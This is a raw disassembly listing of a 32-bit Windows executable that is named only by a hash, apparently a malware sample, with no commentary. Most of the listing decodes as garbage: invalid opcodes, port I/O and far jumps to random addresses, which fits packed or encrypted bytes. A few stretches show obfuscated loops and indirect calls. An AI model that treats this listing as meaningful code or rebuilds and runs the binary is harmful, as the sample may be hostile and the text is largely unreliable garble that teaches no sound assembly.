
f27bd6447e3457aa202b476b32c8493f06fa6466d2359de0f94ebfdd1f2a5c6c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0xd323558c
  40101f:	jo     0x40109f
  401021:	jle    0x4010a1
  401023:	jle    0x400fbd
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	ror    esi,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	packssdw mm0,QWORD PTR [eax]
  401037:	rdpmc  
  401039:	xadd   BYTE PTR [eax],bl
  40103c:	(bad)  
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0xa24eb59e
  4010d2:	add    cl,BYTE PTR fs:[edx-0x46d3b27e]
  4010d9:	inc    esi
  4010da:	jns    0x4010c7
  4010dc:	ficom  WORD PTR [eax+edx*2]
  4010df:	pop    ebx
  4010e0:	iret   
  4010e1:	mov    edi,DWORD PTR [esi+0x65253b79]
  4010e7:	xor    edx,DWORD PTR [ebx]
  4010e9:	enterw 0x561a,0x95
  4010ee:	sysenter 
  4010f0:	int    0x4
  4010f2:	dec    edi
  4010f3:	enter  0x8007,0xf9
  4010f7:	add    eax,0xe82617b
  4010fc:	jo     0x4010c4
  4010fe:	lods   al,BYTE PTR ds:[esi]
  4010ff:	mov    ds:0xa430991d,al
  401104:	push   cs
  401105:	ins    BYTE PTR es:[edi],dx
  401106:	sbb    BYTE PTR [ebx+0x5d],bh
  401109:	sbb    eax,edx
  40110b:	push   dx
  40110d:	add    eax,0x1c546999
  401112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401113:	jl     0x401129
  401115:	aam    0xb0
  401117:	lahf   
  401118:	pop    edi
  401119:	xlat   BYTE PTR ds:[ebx]
  40111a:	pushf  
  40111b:	(bad)  
  40111d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40111e:	push   ecx
  40111f:	shr    BYTE PTR [ebp-0x22],0x61
  401123:	push   ebp
  401124:	mov    ?,edx
  401126:	push   ebx
  401127:	jb     0x4011a7
  401129:	shl    DWORD PTR [edx*1-0x2ca4fe4e],cl
  401130:	fld    DWORD PTR [ecx+0x58]
  401133:	push   0x20
  401135:	pop    esi
  401136:	ret    
  401137:	sbb    eax,eax
  401139:	loope  0x401138
  40113b:	mov    bh,0xea
  40113d:	stos   DWORD PTR es:[edi],eax
  40113e:	mov    ds:0x7bba8dff,eax
  401143:	and    sp,sp
  401146:	ud1    esp,DWORD PTR [ebp-0x14bd7a74]
  40114d:	pop    esp
  40114e:	mov    eax,ds:0x9442d033
  401153:	fsub   DWORD PTR [ebx-0x1494eb88]
  401159:	scas   eax,DWORD PTR es:[edi]
  40115a:	cmp    al,BYTE PTR [ebp+0x93738da]
  401160:	pop    ss
  401161:	sti    
  401162:	cmc    
  401163:	and    edx,DWORD PTR [ecx-0x23d2055]
  401169:	out    0xa3,al
  40116b:	fist   WORD PTR [eax+0x368a9dd1]
  401171:	(bad)  
  401172:	sbb    DWORD PTR [ebx+0x56],esi
  401175:	out    dx,al
  401176:	loopne 0x4011f6
  401178:	imul   eax,DWORD PTR [esi],0xd01d68f2
  40117e:	push   cs
  40117f:	mov    DWORD PTR [ebp+0x1217deba],ecx
  401185:	ss dec ecx
  401187:	ins    BYTE PTR es:[edi],dx
  401188:	xor    al,0xe2
  40118a:	cmp    ebp,DWORD PTR [ebp-0x44]
  40118d:	dec    esp
  40118e:	into   
  40118f:	add    ebx,ecx
  401191:	jnp    0x40114a
  401193:	ret    0x5f63
  401196:	mov    bl,0xfc
  401198:	xchg   ebx,eax
  401199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40119a:	sbb    cl,bl
  40119c:	mov    ch,bl
  40119e:	loopne 0x401149
  4011a0:	fistp  WORD PTR ds:[edx+ebx*1-0x262c19f3]
  4011a8:	cmp    ebp,DWORD PTR [esi+0x17]
  4011ab:	add    eax,0xffec46ae
  4011b0:	or     bl,BYTE PTR [ebp+0x4e]
  4011b3:	in     eax,dx
  4011b4:	in     al,0x63
  4011b6:	pop    ebx
  4011b7:	cmp    ch,BYTE PTR [eax-0x19842d3]
  4011bd:	jne    0x40120c
  4011bf:	pop    es
  4011c0:	sub    bh,dh
  4011c2:	add    bh,BYTE PTR [ecx+eax*8]
  4011c5:	and    ebx,eax
  4011c7:	jecxz  0x4011bd
  4011c9:	mov    bh,0xcb
  4011cb:	fidiv  WORD PTR [ebp+esi*8-0x461fba77]
  4011d2:	cmp    bl,BYTE PTR [ebp+0x0]
  4011d5:	add    BYTE PTR [ebx+0x45c7e04d],cl
  4011db:	fadd   st(1),st
  4011dd:	dec    esi
  4011de:	add    BYTE PTR [eax],al
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x4302d5,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x4302d5
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x4302d5,ecx
  401209:	cmp    DWORD PTR ds:0x4302d5,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ea8b
  401248:	cmp    DWORD PTR ds:0x4302d5,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x4302d5
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x4302d5,ecx
  401262:	cmp    DWORD PTR ds:0x4302d5,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x4302cd,0x1e
  401279:	cmp    DWORD PTR ds:0x4302cd,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x4302cd,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e827
  40129c:	mov    ecx,DWORD PTR ds:0x4302cd
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x4302cd,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx+0x1749052f]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x40130b
  4012cc:	mov    esp,eax
  4012ce:	stos   BYTE PTR es:[edi],al
  4012cf:	fwait
  4012d0:	inc    ecx
  4012d1:	and    al,dh
  4012d3:	jno    0x40126c
  4012d5:	arpl   WORD PTR [edi-0x15581efd],si
  4012db:	push   cs
  4012dc:	(bad)  
  4012dd:	mov    ebx,DWORD PTR [ecx]
  4012df:	adc    edi,eax
  4012e1:	pop    ebp
  4012e2:	iret   
  4012e3:	mov    bl,0x27
  4012e5:	cs (bad) 
  4012e7:	ds sti 
  4012e9:	mov    al,ds:0xc32819b1
  4012ee:	test   al,0x40
  4012f0:	(bad)  
  4012f1:	mov    ch,0x32
  4012f3:	dec    esp
  4012f4:	fsub   QWORD PTR [edx]
  4012f6:	mov    bh,0x51
  4012f8:	imul   edx,DWORD PTR [edi-0x9],0xfffffff9
  4012fc:	retf   0x18c1
  4012ff:	nop
  401300:	ja     0x40134d
  401302:	pop    edx
  401303:	pcmpgtw mm0,QWORD PTR [eax+0x13]
  401307:	xor    ecx,edx
  401309:	es (bad) 
  40130b:	push   eax
  40130c:	out    dx,eax
  40130d:	add    esi,DWORD PTR [ecx-0x2a]
  401310:	sbb    cl,BYTE PTR [edx+0x5]
  401313:	inc    ebp
  401314:	push   es
  401315:	in     eax,0x55
  401317:	and    BYTE PTR [ebx+0x41],dl
  40131a:	inc    eax
  40131b:	pop    eax
  40131c:	sbb    al,0xae
  40131e:	pop    esp
  40131f:	jecxz  0x401354
  401321:	in     eax,0xe
  401323:	into   
  401324:	pop    ebx
  401325:	sub    ebp,DWORD PTR [ecx+0x1af60556]
  40132b:	mov    BYTE PTR [edx+0x6b],ah
  40132e:	ss aam 0x36
  401331:	repz push eax
  401333:	jnp    0x40139a
  401335:	stos   BYTE PTR es:[edi],al
  401336:	push   ebx
  401337:	into   
  401338:	outs   dx,BYTE PTR ds:[esi]
  401339:	icebp  
  40133a:	jae    0x401397
  40133c:	push   esp
  40133d:	dec    esp
  40133e:	in     al,0x85
  401340:	js     0x4013c0
  401342:	add    eax,0xa6e64c8b
  401347:	xchg   edi,eax
  401348:	jp     0x401358
  40134a:	push   ebx
  40134b:	inc    edx
  40134c:	fst    DWORD PTR [edx+0x2973f9e4]
  401352:	mov    eax,0xc5edc6b4
  401357:	dec    eax
  401358:	adc    al,0xd4
  40135a:	jge    0x401364
  40135c:	jb     0x401308
  40135e:	inc    DWORD PTR gs:[edi-0x47]
  401362:	retf   
  401363:	clc    
  401364:	fs cmp eax,0x6bdf5023
  40136a:	jae    0x401351
  40136c:	dec    esp
  40136d:	mov    cl,0xac
  40136f:	add    ecx,DWORD PTR [ecx+0x7b]
  401372:	mov    DWORD PTR [ecx+0x44751440],edx
  401378:	fprem  
  40137a:	add    BYTE PTR [edx+0x1],ah
  40137d:	push   0xffffffb8
  40137f:	sbb    BYTE PTR [ecx],cl
  401381:	jnp    0x4013cf
  401383:	retf   
  401384:	and    edi,edx
  401386:	(bad)  
  401387:	sbb    DWORD PTR [eax+0x55],ebp
  40138a:	test   BYTE PTR [ebx-0x7],bh
  40138d:	sti    
  40138e:	pop    es
  40138f:	(bad)  
  401390:	jmp    FWORD PTR [ecx+ebp*4]
  401393:	(bad)  
  401394:	mov    WORD PTR [edi+0x10],ds
  401397:	pop    esp
  401398:	mov    edx,0xd0a4d545
  40139d:	mov    DWORD PTR ds:0x24d0e12f,esi
  4013a3:	and    al,0x8b
  4013a5:	aas    
  4013a6:	mov    cl,0x24
  4013a8:	xor    ecx,DWORD PTR [edi-0x67]
  4013ab:	int3   
  4013ac:	adc    ebx,0x16
  4013af:	and    bh,BYTE PTR [edx-0xa]
  4013b2:	jne    0x401336
  4013b4:	out    dx,eax
  4013b5:	out    0xe,eax
  4013b7:	test   DWORD PTR [edi+0x55],0x49c66835
  4013be:	aam    0xe
  4013c0:	jno    0x40136e
  4013c2:	stos   DWORD PTR es:[edi],eax
  4013c3:	lock in al,0xe4
  4013c6:	rcr    DWORD PTR [edi-0x707ccc75],0xe1
  4013cd:	int3   
  4013ce:	cmp    DWORD PTR [ebx+0x7c398246],esi
  4013d4:	in     al,dx
  4013d5:	push   edx
  4013d6:	(bad)  
  4013d7:	mov    ds:0x4647b0b3,al
  4013dc:	mov    ebx,0x7914c9e2
  4013e1:	(bad)  ds:0x94430e74
  4013e7:	push   ss
  4013e8:	mov    al,ds:0xe2e47d6
  4013ed:	jo     0x40142e
  4013ef:	mov    esi,0x7a4cb170
  4013f4:	mov    dh,0x48
  4013f6:	mov    dl,0xc4
  4013f8:	add    eax,0xf67d8952
  4013fd:	mov    ah,0x69
  4013ff:	push   edi
  401400:	fbld   TBYTE PTR [edi+edi*8]
  401403:	jo     0x401408
  401405:	fst    QWORD PTR [edi]
  401407:	sub    esi,esi
  401409:	pop    ecx
  40140a:	cmp    al,BYTE PTR [eax-0x1328df5f]
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	adc    esp,ebx
  401413:	jb     0x4013f0
  401415:	sub    DWORD PTR [ecx],0x8b53a01
  40141b:	iret   
  40141c:	sbb    esi,DWORD PTR [ebx]
  40141e:	repz xchg edx,eax
  401420:	in     eax,dx
  401421:	fwait
  401422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401423:	and    al,0x7e
  401425:	retf   0x92f1
  401428:	das    
  401429:	sbb    ebx,DWORD PTR [edi]
  40142b:	push   ebp
  40142c:	stc    
  40142d:	aaa    
  40142e:	hlt    
  40142f:	mov    cl,0xf2
  401431:	test   BYTE PTR [ebx],bh
  401433:	scas   al,BYTE PTR es:[edi]
  401434:	mov    ecx,0x89ab92b9
  401439:	push   ebx
  40143a:	add    bl,BYTE PTR [edi+0x45]
  40143d:	inc    esp
  40143e:	call   FWORD PTR [esi-0x65]
  401441:	data16 sti 
  401443:	jle    0x401423
  401445:	xchg   ebp,eax
  401446:	push   ds
  401447:	fsubr  st(1),st
  401449:	fwait
  40144a:	jmp    0x5d22:0xd5679537
  401451:	jnp    0x4014c6
  401453:	retf   0x1fb1
  401456:	xor    edi,ecx
  401458:	iret   
  401459:	jae    0x40145b
  40145b:	and    al,0x97
  40145d:	xor    edx,DWORD PTR [ebp+0x77]
  401460:	ss jmp 0x3c0f7aea
  401466:	test   eax,0x83ca7490
  40146b:	stos   BYTE PTR es:[edi],al
  40146c:	push   ebp
  40146d:	test   DWORD PTR [edi],0xb956c832
  401473:	cmp    al,0x8a
  401475:	add    BYTE PTR [eax],al
  401477:	adc    DWORD PTR ds:0x42ec5b,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x4302b9
  40148b:	or     DWORD PTR ds:0x43036b,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x3d4d0fff
  4014a7:	push   0x7e7dc2f9
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x40146f
  4014b2:	fwait
  4014b3:	push   edi
  4014b4:	pusha  
  4014b5:	pop    ebp
  4014b6:	das    
  4014b7:	xchg   edi,eax
  4014b8:	push   es
  4014b9:	dec    esp
  4014ba:	dec    DWORD PTR [ecx+0x48]
  4014bd:	addr16 lahf 
  4014bf:	adc    al,0x73
  4014c1:	mul    BYTE PTR [esi]
  4014c3:	push   ecx
  4014c4:	adc    dh,BYTE PTR [ebx+ebp*1-0x5b]
  4014c8:	sbb    esi,esp
  4014ca:	pop    bx
  4014cc:	mov    edi,0x7a7712db
  4014d1:	push   cs
  4014d2:	int3   
  4014d3:	js     0x401545
  4014d5:	retw   
  4014d7:	les    ebx,FWORD PTR [esi]
  4014d9:	jne    0x40145e
  4014db:	and    dh,BYTE PTR [ecx]
  4014dd:	jg     0x4014e8
  4014df:	popa   
  4014e0:	lods   eax,DWORD PTR ds:[esi]
  4014e1:	cld    
  4014e2:	pop    ss
  4014e3:	aam    0x77
  4014e5:	sub    BYTE PTR [ebx-0xe],al
  4014e8:	mov    al,ds:0x5cfb7c97
  4014ed:	mov    eax,ds:0x45a7aced
  4014f2:	sub    eax,ecx
  4014f4:	pop    edx
  4014f5:	add    esp,esp
  4014f7:	test   DWORD PTR [esi],ecx
  4014f9:	jge    0x4014b2
  4014fb:	or     ebp,ebp
  4014fd:	cmp    eax,0xc74f84a3
  401502:	call   DWORD PTR [ebx]
  401504:	mov    ebx,0x1e78e756
  401509:	sub    cl,cl
  40150b:	jecxz  0x401551
  40150d:	sbb    ah,BYTE PTR [bp-0x30]
  401511:	add    BYTE PTR [edi-0x2f238912],ch
  401517:	add    ebp,DWORD PTR [ebx]
  401519:	dec    edi
  40151a:	jmp    0x45e5:0x48042772
  401521:	jbe    0x401510
  401523:	sbb    eax,DWORD PTR [ecx+ecx*4+0xe]
  401527:	sub    al,0x81
  401529:	(bad)  
  40152a:	bnd jne 0x4015aa
  40152d:	add    BYTE PTR [esi],al
  40152f:	sbb    dh,BYTE PTR [ebx-0x2b]
  401532:	pop    ss
  401533:	pop    eax
  401534:	(bad)  
  401535:	aaa    
  401536:	mov    al,ds:0x3c34d968
  40153b:	test   al,0x5f
  40153d:	mov    esi,0xfb089efd
  401542:	ret    0x209a
  401545:	push   edx
  401546:	sub    ebx,esp
  401548:	test   al,0xfe
  40154a:	repnz pop ebx
  40154c:	int    0x6d
  40154e:	fcomp  QWORD PTR [esi+0x715ef60b]
  401554:	sbb    edi,DWORD PTR [ecx+eax*8-0x4e039caf]
  40155b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40155c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40155d:	and    eax,0x66020161
  401562:	push   ebx
  401563:	jmp    0x3daf6381
  401568:	nop
  401569:	sbb    BYTE PTR [edx+0x60fe01d3],0x7f
  401570:	in     eax,0x8a
  401572:	sub    eax,0x44800ce9
  401577:	cs push eax
  401579:	std    
  40157a:	repnz sbb esi,DWORD PTR [ecx]
  40157d:	hlt    
  40157e:	push   ebx
  40157f:	leave  
  401580:	xchg   esp,eax
  401581:	jb     0x4015c0
  401583:	in     eax,0xd2
  401585:	adc    bh,ah
  401587:	jge    0x40155d
  401589:	jge    0x401575
  40158b:	jl     0x401516
  40158d:	out    dx,al
  40158e:	xchg   ecx,eax
  401590:	jns    0x401545
  401592:	fbstp  TBYTE PTR ds:0x5073a680
  401598:	mov    bl,0xf0
  40159a:	mov    bl,0xa2
  40159c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40159e:	(bad)  
  40159f:	sbb    DWORD PTR [eax-0x1e],ebx
  4015a2:	mov    al,ds:0xcf0bf33a
  4015a7:	clc    
  4015a8:	hlt    
  4015a9:	outs   dx,BYTE PTR ds:[esi]
  4015aa:	ja     0x40154b
  4015ac:	adc    ecx,DWORD PTR [ebx]
  4015ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015af:	cmp    ch,al
  4015b1:	in     al,dx
  4015b2:	and    edx,DWORD PTR [ecx]
  4015b4:	mov    dh,0x4b
  4015b6:	repz adc bl,dh
  4015b9:	mov    ds:0x24a1a21,al
  4015be:	pop    esi
  4015bf:	and    DWORD PTR [esp+ebx*8+0x45cdd8d3],ebx
  4015c6:	inc    edx
  4015c7:	je     0x401599
  4015c9:	xchg   esi,eax
  4015ca:	or     eax,0x4f12a1e0
  4015cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015d0:	fsubrp st(3),st
  4015d2:	and    cl,ah
  4015d4:	pusha  
  4015d5:	pop    esi
  4015d6:	xor    al,0x62
  4015d8:	inc    DWORD PTR [ebp+0x38]
  4015db:	adc    eax,0xb2016213
  4015e0:	pop    ds
  4015e1:	leave  
  4015e2:	pusha  
  4015e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e4:	ja     0x4015ea
  4015e6:	xor    al,0xb3
  4015e8:	and    eax,0x1871f356
  4015ed:	imul   ebp,eax,0x10
  4015f0:	and    ebp,DWORD PTR ds:0x49f1b9c1
  4015f6:	ret    0x7c2f
  4015f9:	pop    ecx
  4015fa:	jns    0x4015f1
  4015fc:	push   ss
  4015fd:	xor    DWORD PTR [ecx],esp
  4015ff:	jl     0x40163f
  401601:	bound  edi,QWORD PTR [edx+0x74]
  401604:	leave  
  401605:	lea    edx,[eax-0x60]
  401608:	xrelease mov DWORD PTR [ecx],esi
  40160b:	or     al,0x2a
  40160d:	stc    
  40160e:	sub    DWORD PTR [esi+0x1a4e7610],edi
  401614:	ins    BYTE PTR es:[edi],dx
  401615:	std    
  401616:	mov    cl,0x0
  401618:	sub    eax,0x7e55e293
  40161d:	fnstcw WORD PTR [edi+eax*1]
  401620:	mov    ebx,0x619ee76f
  401625:	fisttp WORD PTR [ecx-0x56]
  401628:	and    al,0x30
  40162a:	sub    dh,ah
  40162c:	xchg   DWORD PTR [ebx],eax
  40162e:	mov    al,ds:0xbcd4c36f
  401633:	aam    0xb5
  401635:	xchg   ebx,eax
  401636:	xor    al,BYTE PTR [edi]
  401638:	cmp    ah,bh
  40163a:	call   0x17ecf6ef
  40163f:	inc    ebx
  401640:	sbb    DWORD PTR [ecx-0x40da529e],ebp
  401646:	idiv   DWORD PTR [esi-0x67]
  401649:	aad    0xa4
  40164b:	sbb    bh,BYTE PTR [ecx+0x3a2434df]
  401651:	(bad)  
  401652:	inc    esi
  401653:	inc    edi
  401654:	ret    0x730
  401657:	push   edi
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	in     al,0x1b
  40166d:	inc    ecx
  40166e:	int3   
  40166f:	ins    BYTE PTR es:[edi],dx
  401670:	jp     0x4016f0
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x401685
  401678:	(bad)  
  401679:	test   eax,0x6a0d17b2
  40167f:	aaa    
  401680:	scas   eax,DWORD PTR es:[edi]
  401681:	push   0x2a
  401683:	sbb    dl,BYTE PTR [edi-0x37]
  401686:	jmp    0x40167d
  401688:	cmp    eax,0xc6509851
  40168d:	loopne 0x401694
  40168f:	xor    ah,BYTE PTR [ebx]
  401691:	cmp    BYTE PTR [ebp-0x21],0x9e
  401695:	inc    esp
  401696:	sub    DWORD PTR [ebp+eax*2+0x5f],eax
  40169a:	dec    edx
  40169b:	and    eax,0x9f211597
  4016a0:	pop    ecx
  4016a1:	lea    eax,[eax-0x5bc3418b]
  4016a7:	push   0x17
  4016a9:	mov    ds:0x27bc7e3e,eax
  4016ae:	adc    cl,BYTE PTR [eax-0x34bd2794]
  4016b4:	(bad)  [edx]
  4016b6:	cld    
  4016b7:	jb     0x4016d2
  4016b9:	xchg   BYTE PTR [ecx+edi*4+0x3b],dl
  4016bd:	rcl    DWORD PTR cs:[ebp-0x39],1
  4016c1:	enter  0x88d,0x98
  4016c5:	icebp  
  4016c6:	jmp    0xb6ed1894
  4016cb:	inc    ebx
  4016cc:	or     eax,0x72e0aed1
  4016d1:	mov    dl,0x9a
  4016d3:	mov    eax,ds:0xaf7b06
  4016d8:	rcl    ch,cl
  4016da:	in     eax,0x90
  4016dc:	pop    edi
  4016dd:	push   edi
  4016de:	mov    al,0xd4
  4016e0:	dec    esp
  4016e1:	mov    ch,0xd6
  4016e3:	shr    BYTE PTR [ebp-0x80],cl
  4016e6:	pop    ebp
  4016e7:	out    0xc4,al
  4016e9:	xchg   ebp,eax
  4016ea:	adc    BYTE PTR [eax],cl
  4016ec:	inc    esi
  4016ed:	sbb    DWORD PTR [edx],eax
  4016ef:	loopne 0x4016be
  4016f1:	xchg   esp,eax
  4016f2:	jno    0x4016ca
  4016f4:	and    al,0xfb
  4016f6:	mov    al,0x68
  4016f8:	(bad)  
  4016fa:	adc    eax,0xca63aaca
  4016ff:	and    BYTE PTR ds:0xe2fcb779,cl
  401705:	xchg   ebx,eax
  401706:	sub    ah,BYTE PTR ds:0x1663e2cd
  40170c:	dec    ecx
  40170d:	loopne 0x401704
  40170f:	shr    DWORD PTR [edi+0x3],1
  401712:	push   edi
  401713:	xor    dh,0xa6
  401716:	bound  ebx,QWORD PTR [ecx]
  401718:	mov    dh,dh
  40171a:	call   0x9222b3ff
  40171f:	push   es
  401720:	or     edx,0x10
  401723:	scas   eax,DWORD PTR es:[edi]
  401724:	cmp    eax,0x6e89488f
  401729:	push   esi
  40172a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40172b:	push   esp
  40172c:	iret   
  40172d:	popa   
  40172e:	pop    ecx
  40172f:	inc    eax
  401730:	jg     0x40178e
  401732:	pop    eax
  401733:	scas   eax,DWORD PTR es:[edi]
  401734:	adc    DWORD PTR [esi],edx
  401736:	in     al,0x52
  401738:	inc    ebp
  401739:	push   esp
  40173a:	clc    
  40173b:	(bad)  
  40173c:	das    
  40173d:	lea    edi,[ebx]
  40173f:	fs cmp dl,ch
  401742:	mov    ebp,0x44e846e
  401747:	je     0x4016ed
  401749:	loopne 0x4016dd
  40174b:	push   ss
  40174c:	and    eax,0xc81fdf56
  401751:	int3   
  401752:	and    eax,0x4524ea06
  401757:	dec    edi
  401758:	call   0x2531258f
  40175d:	stos   BYTE PTR es:[edi],al
  40175e:	fild   WORD PTR [ecx+ebx*8]
  401762:	dec    ebp
  401763:	daa    
  401764:	adc    eax,0x5a3104e6
  401769:	push   es
  40176a:	iret   
  40176b:	mov    eax,0xdc09f97a
  401770:	inc    edx
  401771:	pop    esp
  401772:	add    edi,DWORD PTR [ebx-0x18850583]
  401778:	ret    0x3e4e
  40177b:	ins    DWORD PTR es:[edi],dx
  40177c:	and    eax,0x1bff5fd5
  401781:	stc    
  401782:	mov    ch,0x70
  401784:	or     eax,0xe4ebd486
  401789:	int3   
  40178a:	mov    dl,0xc2
  40178c:	ret    0xa66b
  40178f:	push   ecx
  401790:	jge    0x40173a
  401792:	add    DWORD PTR [esi],esi
  401794:	push   es
  401795:	popf   
  401796:	ins    DWORD PTR es:[edi],dx
  401797:	sub    ebx,DWORD PTR [edi+0x3c45c368]
  40179d:	add    ebx,DWORD PTR [ebx+0x26d07908]
  4017a3:	dec    edx
  4017a4:	(bad)  
  4017a5:	or     ebp,eax
  4017a7:	gs inc eax
  4017a9:	je     0x401733
  4017ab:	es repnz pop ebx
  4017ae:	hlt    
  4017af:	out    0xd3,eax
  4017b1:	in     eax,dx
  4017b2:	cdq    
  4017b3:	mov    ecx,0x1c87b053
  4017b8:	lea    edi,[eax+0x51fca655]
  4017be:	xchg   edi,eax
  4017bf:	paddsw mm7,QWORD PTR [esp+eax*1+0x4f]
  4017c4:	jmp    0x738136d8
  4017c9:	xlat   BYTE PTR gs:[ebx]
  4017cb:	cwde   
  4017cc:	aad    0x4d
  4017ce:	ins    BYTE PTR es:[edi],dx
  4017cf:	xor    ch,bl
  4017d1:	fdiv   DWORD PTR [ebp-0x7f]
  4017d4:	jne    0x4017cb
  4017d6:	mov    dl,0x6c
  4017d8:	inc    esi
  4017d9:	fmul   QWORD PTR ds:0xa3fff5b3
  4017df:	popa   
  4017e0:	nop
  4017e1:	sub    eax,0xb64de89e
  4017e6:	push   eax
  4017e7:	jmp    0x29092205
  4017ec:	nop
  4017ed:	push   ss
  4017ee:	gs pop ebp
  4017f0:	dec    ebx
  4017f1:	mov    ecx,0x4c59c160
  4017f6:	retf   
  4017f7:	push   ss
  4017f8:	ficom  DWORD PTR [edi+edx*4]
  4017fb:	mov    ecx,0x8d525eaa
  401800:	mov    bl,0x19
  401802:	aas    
  401803:	frstor [eax+0x3bdea1b0]
  401809:	or     BYTE PTR [ebx+ebp*1-0x10],dl
  40180d:	stos   DWORD PTR es:[edi],eax
  40180e:	aad    0xcc
  401810:	or     al,0x11
  401812:	adc    DWORD PTR [eax+eax*4-0x6e],edx
  401816:	push   0xda39c48a
  40181b:	iret   
  40181c:	fdivr  QWORD PTR [edi+0x3b02]
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x4302d5,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x4302d9,0x0
  40183c:	mov    esi,DWORD PTR ds:0x4302d9
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x4302d9,esi
  401849:	cmp    DWORD PTR ds:0x4302d9,0x1d
